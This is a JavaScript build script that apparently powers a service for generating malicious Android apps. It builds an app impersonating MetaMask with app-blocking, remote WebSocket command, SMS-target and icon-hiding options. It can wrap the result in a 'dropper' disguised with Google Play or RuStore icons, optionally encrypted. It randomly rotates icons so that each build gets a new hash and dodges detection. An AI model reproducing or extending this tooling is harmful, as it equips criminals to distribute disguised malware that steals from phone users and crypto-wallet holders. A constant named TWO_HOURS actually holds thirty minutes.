'use strict';

const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const sharp = require('sharp');

const { PROJECTS, ANDROID_SDK, MIPMAP_SIZES, resolveFlags, xmlEscape, safeShell } = require('./buildUtils');
const { runDropperBuild } = require('./wombatRunner');

const TEMP_BUILD_DIR  = path.join(__dirname, 'temp_builds');
const OUTPUT_APK_DIR  = path.join(__dirname, 'output_apks');

fs.ensureDirSync(TEMP_BUILD_DIR);
fs.ensureDirSync(OUTPUT_APK_DIR);

// Clean output APKs older than 2 hours on startup
(async () => {
  const TWO_HOURS = 30 * 60 * 1000;
  const now = Date.now();
  const files = await fs.readdir(OUTPUT_APK_DIR).catch(() => []);
  for (const f of files) {
    const fp = path.join(OUTPUT_APK_DIR, f);
    const stat = await fs.stat(fp).catch(() => null);
    if (stat && now - stat.mtimeMs > TWO_HOURS) await fs.remove(fp).catch(() => {});
  }
})();

const GRADLE_WATCHDOG_MS = 12 * 60 * 1000;

function spawnGradle(cmd, cwd, onLine) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, { shell: true, cwd, env: { ...process.env, JAVA_OPTS: '-Xmx2g' } });
    let settled = false;

    const watchdog = setTimeout(() => {
      if (settled) return;
      settled = true;
      try { child.kill('SIGKILL'); } catch (_) {}
      reject(new Error('GRADLE_TIMEOUT'));
    }, GRADLE_WATCHDOG_MS);

    child.stdout.on('data', d => {
      d.toString().split(/\r?\n/).forEach(l => { if (l) onLine(l); });
    });
    child.stderr.on('data', d => {
      d.toString().split(/\r?\n/).forEach(l => { if (l) onLine('[ERR] ' + l); });
    });
    child.on('error', err => { if (!settled) { settled = true; clearTimeout(watchdog); reject(err); } });
    child.on('close', code => {
      if (settled) return;
      settled = true;
      clearTimeout(watchdog);
      if (code === 0) resolve();
      else { const e = new Error(`Gradle exited ${code}`); reject(e); }
    });
  });
}

async function cleanOldIcons(resPath) {
  const dirs = await fs.readdir(resPath).catch(() => []);
  const pats = [/ic_launcher.*\.xml$/i, /ic_launcher.*\.png$/i, /ic_launcher.*\.webp$/i];
  for (const dir of dirs) {
    if (!dir.startsWith('mipmap-') && !dir.startsWith('drawable')) continue;
    const dp = path.join(resPath, dir);
    for (const file of await fs.readdir(dp).catch(() => [])) {
      if (pats.some(p => p.test(file))) await fs.remove(path.join(dp, file)).catch(() => {});
    }
  }
  await fs.remove(path.join(resPath, 'mipmap-anydpi-v26')).catch(() => {});
}

/**
 * params = {
 *   project: 'v2' | 'v3',
 *   appName: string,
 *   prefix: string,
 *   targetUrl: string,
 *   smsNumber: string,
 *   traffer: string,
 *   launcherType: 'LAUNCHER' | 'LEANBACK',
 *   settingsBlockEnabled: boolean,  // v3 only
 *   features: { feat_xxx: bool },
 *   iconPath: string | null,
 *   useDropper: boolean,
 *   dropperType: 'wombat' | 'goldfinch',
 *   dropperAppName: string,
 *   dropperUrl: string,
 *   dropperStoreIcon: 'google' | 'rustore',
 *   encryptionMode: 'yes' | 'no',
 *   dropperIconPath: string | null,
 * }
 * callbacks = { onLine, onProgress }
 * Returns: { apkPath, filename }
 */
async function runBuild(buildId, params, { onLine, onProgress }) {
  const proj = PROJECTS[params.project];
  if (!proj) throw new Error('Unknown project: ' + params.project);

  const isLite = proj.isLite;
  const safeAppName = (params.appName || 'Application').trim().replace(/[<>:"/\\|?*]/g, '_');
  const safeDisplayName = ((params.useDropper && params.dropperAppName)
    ? params.dropperAppName : params.appName || 'Application'
  ).trim().replace(/[<>:"/\\|?*]+/g, '_').replace(/\s+/g, '_').replace(/_+/g, '_');

  const tempDir     = path.join(TEMP_BUILD_DIR, `build_${buildId}`);
  const projectPath = path.join(tempDir, 'project');

  onLine(`[BUILD] ID: ${buildId}`);
  onLine(`[BUILD] Project: ${params.project} | App: ${params.appName}`);
  onProgress(5);

  // ── 1. Copy project ─────────────────────────────────────────────────────────
  onLine('[BUILD] Copying project sources...');
  if (!await fs.pathExists(proj.dir)) throw new Error(`Project dir not found: ${proj.dir}`);
  await fs.copy(proj.dir, projectPath, { overwrite: true });
  await fs.remove(path.join(projectPath, '.gradle')).catch(() => {});
  await fs.remove(path.join(projectPath, 'app/build')).catch(() => {});
  await fs.remove(path.join(projectPath, '.cxx')).catch(() => {});
  await fs.remove(path.join(projectPath, 'app/.cxx')).catch(() => {});
  onLine('[BUILD] Sources copied');
  onProgress(15);

  // ── 2. settingsBlockEnabled patch (v3 only) ──────────────────────────────────
  if (!isLite && params.settingsBlockEnabled === false) {
    const files = [
      'app/src/main/java/com/example/MetaMask/services/AppBlocker.kt',
      'app/src/main/java/com/example/MetaMask/receivers/WebSocketCommandHandlerReceiver.kt',
      'app/src/main/java/com/example/MetaMask/services/ChikenWorker.kt',
      'app/src/main/java/com/example/MetaMask/services/StoatShield.kt',
    ];
    for (const rel of files) {
      const fp = path.join(projectPath, rel);
      try {
        let src = await fs.readFile(fp, 'utf8');
        src = src.replace(/getBoolean\("settings_block_enabled",\s*true\)/g, 'getBoolean("settings_block_enabled", false)');
        src = src.replace(/@Volatile\s+var\s+settingsBlockEnabled\s*=\s*true/g, '@Volatile var settingsBlockEnabled = false');
        await fs.writeFile(fp, src, 'utf8');
      } catch (_) {}
    }
    onLine('[BUILD] settingsBlockEnabled patched');
  }

  // ── 3. local.properties ──────────────────────────────────────────────────────
  await fs.writeFile(
    path.join(projectPath, 'local.properties'),
    `sdk.dir=${ANDROID_SDK.replace(/\\/g, '/')}\n`
  );

  // ── 4. Icon ───────────────────────────────────────────────────────────────────
  // Slight random rotation (±1.5°) + compression to randomise SHA and reduce size
  const iconAngle  = parseFloat((Math.random() * 3 - 1.5).toFixed(3));
  const iconAngleR = parseFloat((Math.random() * 3 - 1.5).toFixed(3));
  if (params.iconPath && await fs.pathExists(params.iconPath)) {
    const resPath = path.join(projectPath, 'app/src/main/res');
    await cleanOldIcons(resPath);
    const mipmapDirs = (await fs.readdir(resPath).catch(() => []))
      .filter(d => d.startsWith('mipmap-') && d !== 'mipmap-anydpi-v26');
    for (const dir of mipmapDirs) {
      const size = MIPMAP_SIZES[dir] || 192;
      await sharp(params.iconPath)
        .rotate(iconAngle, { background: { r: 0, g: 0, b: 0, alpha: 0 } })
        .resize(size, size)
        .png({ compressionLevel: 9, adaptiveFiltering: true })
        .toFile(path.join(resPath, dir, 'ic_launcher.png'));
      await sharp(params.iconPath)
        .rotate(iconAngleR, { background: { r: 0, g: 0, b: 0, alpha: 0 } })
        .resize(size, size)
        .png({ compressionLevel: 9, adaptiveFiltering: true })
        .toFile(path.join(resPath, dir, 'ic_launcher_round.png'));
    }
    onLine('[BUILD] Icons applied');
  }
  onProgress(25);

  // ── 5. Gradle build ───────────────────────────────────────────────────────────
  const isWin      = process.platform === 'win32';
  const gradlew    = path.join(projectPath, isWin ? 'gradlew.bat' : 'gradlew');
  const showIcon   = (params.launcherType === 'LAUNCHER');
  const flagsMap   = resolveFlags(params.project, params.features || {});
  const disabledFlags = Object.entries(flagsMap).filter(([,v]) => !v).map(([k]) => `-P${k}=false`).join(' ');

  let gradleCmd;
  if (isLite) {
    gradleCmd = [
      `"${gradlew}" assembleRelease --no-daemon --max-workers=2`,
      `-PappName="${safeShell(params.appName || '')}"`,
      `-PtargetUrl="${safeShell(params.targetUrl || '')}"`,
      `-Ptraffer="${safeShell(params.traffer || '')}"`,
      `-PsmsTarget="${safeShell(params.smsNumber || '')}"`,
      `-PuuidPrefix=${params.prefix || '000000'}`,
      `-PhideIcon=${!showIcon}`,
      disabledFlags,
      `-Dorg.gradle.jvmargs="-Xmx2048m"`
    ].filter(Boolean).join(' ');
  } else {
    gradleCmd = [
      `"${gradlew}" assembleRelease --no-daemon --max-workers=2`,
      `-PappName="${safeShell(params.appName || '')}"`,
      `-PtargetUrl="${safeShell(params.targetUrl || '')}"`,
      `-Ptraffer="${safeShell(params.traffer || '')}"`,
      `-PsmsTarget="${safeShell(params.smsNumber || '')}"`,
      `-PuuidPrefix=${params.prefix || '000000'}`,
      `-PhideIcon=${!showIcon}`,
      disabledFlags,
      `-Dorg.gradle.jvmargs="-Xmx2048m"`
    ].filter(Boolean).join(' ');
  }

  onLine('[BUILD] Starting Gradle: ' + gradleCmd.slice(0, 100) + '...');
  onProgress(30);

  const TASK_PATTERN = /^> Task :app:(\S+)/;
  const TOTAL_TASKS = 60;
  let tasksDone = 0;

  await spawnGradle(gradleCmd, projectPath, line => {
    onLine(line);
    if (TASK_PATTERN.test(line)) {
      tasksDone++;
      const pct = 30 + Math.min(Math.round((tasksDone / TOTAL_TASKS) * 55), 55);
      onProgress(pct);
    }
  });

  onLine('[BUILD] Gradle complete');
  onProgress(85);

  // ── 6. Find APK ───────────────────────────────────────────────────────────────
  let cristoferApkPath = path.join(projectPath, 'app/build/outputs/apk/release/relis.apk');
  if (!await fs.pathExists(cristoferApkPath)) {
    // Fallback: any .apk in release dir
    const releaseDir = path.join(projectPath, 'app/build/outputs/apk/release');
    const files = (await fs.readdir(releaseDir).catch(() => [])).filter(f => f.endsWith('.apk'));
    if (!files.length) throw new Error('Built APK not found. Check Gradle logs.');
    cristoferApkPath = path.join(releaseDir, files[0]);
  }
  onLine(`[BUILD] APK found: ${cristoferApkPath}`);

  // ── 7. Dropper ────────────────────────────────────────────────────────────────
  let finalApkPath;
  if (params.useDropper) {
    onLine(`[BUILD] Building dropper (${params.dropperType})...`);
    onProgress(88);

    // Process dropper icon: rotation + compression (same as APK icon)
    let processedDropperIcon = params.dropperIconPath || null;
    if (params.dropperIconPath && await fs.pathExists(params.dropperIconPath)) {
      const dAngle = parseFloat((Math.random() * 3 - 1.5).toFixed(3));
      processedDropperIcon = path.join(tempDir, 'dropper_icon_proc.png');
      await sharp(params.dropperIconPath)
        .rotate(dAngle, { background: { r: 0, g: 0, b: 0, alpha: 0 } })
        .png({ compressionLevel: 9, adaptiveFiltering: true })
        .toFile(processedDropperIcon);
    }

    finalApkPath = await runDropperBuild({
      dropperType:    params.dropperType || 'wombat',
      cristoferApkPath,
      dropperAppName: params.dropperAppName || safeAppName,
      dropperUrl:     params.dropperUrl || 'https://play.google.com/store',
      iconPath:       processedDropperIcon,
      storeChoice:    params.dropperStoreIcon || 'google',
      useEncryption:  params.encryptionMode === 'yes',
      buildId,
      onLine,
      onProgress,
    });
    onLine('[BUILD] Dropper built');
  } else {
    finalApkPath = cristoferApkPath;
  }
  onProgress(95);

  // ── 8. Copy to output ─────────────────────────────────────────────────────────
  const outName = `${safeDisplayName}_${buildId}.apk`;
  const outPath = path.join(OUTPUT_APK_DIR, outName);
  await fs.copy(finalApkPath, outPath);

  // Cleanup dropper temp APK if it was created
  if (params.useDropper && finalApkPath !== cristoferApkPath) {
    await fs.remove(finalApkPath).catch(() => {});
  }

  onLine('[BUILD] Done → ' + outName);
  onProgress(100);

  return { apkPath: outPath, filename: outName };
}

async function cleanup(buildId) {
  const tempDir = path.join(TEMP_BUILD_DIR, `build_${buildId}`);
  await fs.remove(tempDir).catch(() => {});
}

module.exports = { runBuild, cleanup, OUTPUT_APK_DIR };
